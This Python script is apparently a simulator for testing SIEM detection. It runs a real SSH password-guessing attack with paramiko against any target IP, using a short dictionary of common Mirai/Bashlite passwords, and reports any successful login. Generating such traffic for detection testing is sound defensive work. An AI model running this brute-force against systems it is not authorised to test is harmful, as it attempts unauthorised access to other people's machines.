import paramiko
import time
import argparse
import sys

def simulate_brute_force(target_ip, target_user, passwords):
    print(f"[*] Starting SSH brute-force simulation against {target_user}@{target_ip}")
    
    for password in passwords:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            print(f"[*] Attempting password: {password}")
            # The goal is to generate auth failures against the real Windows OpenSSH Server (port 22)
            client.connect(target_ip, port=22, username=target_user, password=password, timeout=3)
            print(f"[+] Success! Wait, this wasn't supposed to happen with password: {password}")
            client.close()
        except paramiko.AuthenticationException:
            print(f"[-] Authentication failed for password: {password} (Expected)")
        except Exception as e:
            print(f"[!] Connection error: {e}")
        finally:
            client.close()
            
        # Small delay to make it realistic but fast enough to trigger the 5-min threshold
        time.sleep(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Brute Force Simulator for SIEM Testing")
    parser.add_argument("--target", required=True, help="Target IP address (e.g., 127.0.0.1 or VM IP)")
    parser.add_argument("--user", default="root", help="Target SSH username")
    parser.add_argument("--count", type=int, default=10, help="Number of failed attempts to simulate")
    
    args = parser.parse_args()
    
    # Real-world IoT Botnet Dictionary (Mirai/Bashlite common passwords)
    real_world_dictionary = [
        "123456", "password", "admin", "admin123", "root",
        "12345", "12345678", "qwerty", "111111", "support",
        "changeme", "default", "guest", "ubuntu", "raspberry"
    ]
    
    # We slice the list to the requested count to simulate the attack
    attack_passwords = real_world_dictionary[:args.count]
    
    # If the user requests more passwords than our mini dictionary, we pad it out
    while len(attack_passwords) < args.count:
        attack_passwords.append(f"brute_force_{len(attack_passwords)}")
        
    simulate_brute_force(args.target, args.user, attack_passwords)
    print("\n[*] Simulation complete. Check your SIEM for auth failure logs.")
